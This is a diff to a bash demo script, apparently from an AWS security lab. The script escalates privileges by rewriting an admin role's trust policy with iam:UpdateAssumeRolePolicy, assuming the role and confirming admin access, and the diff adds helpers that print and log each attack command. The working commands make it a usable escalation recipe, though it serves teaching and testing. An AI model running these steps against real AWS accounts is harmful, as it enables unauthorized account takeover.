@@ -4,7 +4,6 @@
 # This scenario demonstrates how a user with iam:UpdateAssumeRolePolicy permission
 # can modify an admin role's trust policy to grant themselves access.
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -15,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-012-to-admin-starting-user"
@@ -74,6 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -85,6 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -95,6 +114,7 @@ echo "Target role: $TARGET_ROLE_NAME"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 
 echo -e "\nRetrieving current trust policy..."
+show_cmd "aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json"
 CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Current trust policy:"
 echo "$CURRENT_TRUST_POLICY" | jq '.'
@@ -106,6 +126,7 @@ echo -e "${GREEN}✓ Saved original trust policy${NC}\n"
 # Step 5: Verify we cannot assume the target role yet
 echo -e "${YELLOW}Step 5: Verifying we cannot assume target role yet${NC}"
 echo "Attempting to assume target role (should fail)..."
+show_cmd "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name test-session"
 if aws sts assume-role --role-arn "$TARGET_ROLE_ARN" --role-session-name test-session &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly able to assume target role already${NC}"
 else
@@ -116,6 +137,7 @@ echo ""
 # Step 6: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -128,6 +150,7 @@ echo -e "${YELLOW}Step 7: Exploiting iam:UpdateAssumeRolePolicy permission${NC}"
 echo "Modifying target role trust policy to allow $STARTING_USER to assume it..."
 
 # Get our user ARN
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 USER_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Our user ARN: $USER_ARN"
 
@@ -151,6 +174,7 @@ echo -e "\nNew trust policy to be applied:"
 echo "$NEW_TRUST_POLICY" | jq '.'
 
 # Update the trust policy
+show_attack_cmd "aws iam update-assume-role-policy --role-name $TARGET_ROLE_NAME --policy-document \"$NEW_TRUST_POLICY\""
 aws iam update-assume-role-policy \
     --role-name $TARGET_ROLE_NAME \
     --policy-document "$NEW_TRUST_POLICY"
@@ -164,6 +188,7 @@ echo -e "${GREEN}✓ IAM changes propagated${NC}\n"
 
 # Step 8: Verify the trust policy was updated
 echo -e "${YELLOW}Step 8: Verifying trust policy modification${NC}"
+show_cmd "aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json"
 UPDATED_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Updated trust policy:"
 echo "$UPDATED_TRUST_POLICY" | jq '.'
@@ -173,6 +198,7 @@ echo -e "${GREEN}✓ Trust policy successfully modified${NC}\n"
 echo -e "${YELLOW}Step 9: Assuming the target admin role${NC}"
 echo "Role ARN: $TARGET_ROLE_ARN"
 
+show_attack_cmd "aws sts assume-role --role-arn \"$TARGET_ROLE_ARN\" --role-session-name admin-escalation-session --output json"
 TARGET_CREDENTIALS=$(aws sts assume-role \
     --role-arn "$TARGET_ROLE_ARN" \
     --role-session-name admin-escalation-session \
@@ -186,6 +212,7 @@ export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.Sess
 export AWS_REGION=$AWS_REGION
 
 # Verify target role assumption
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target admin role!${NC}\n"
@@ -194,6 +221,7 @@ echo -e "${GREEN}✓ Successfully assumed target admin role!${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -217,6 +245,13 @@ echo "5. Achieved: Full administrative access to the AWS account"
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (iam:UpdateAssumeRolePolicy) → Modify Trust → (sts:AssumeRole) → $TARGET_ROLE → Administrator"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Modified trust policy on role: $TARGET_ROLE_NAME"
 echo "- Active assumed role session: admin-escalation-session"
@@ -225,3 +260,6 @@ echo -e "\n${RED}⚠ Warning: The target role's trust policy has been modified${
 echo -e "${YELLOW}To clean up and restore the original trust policy:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
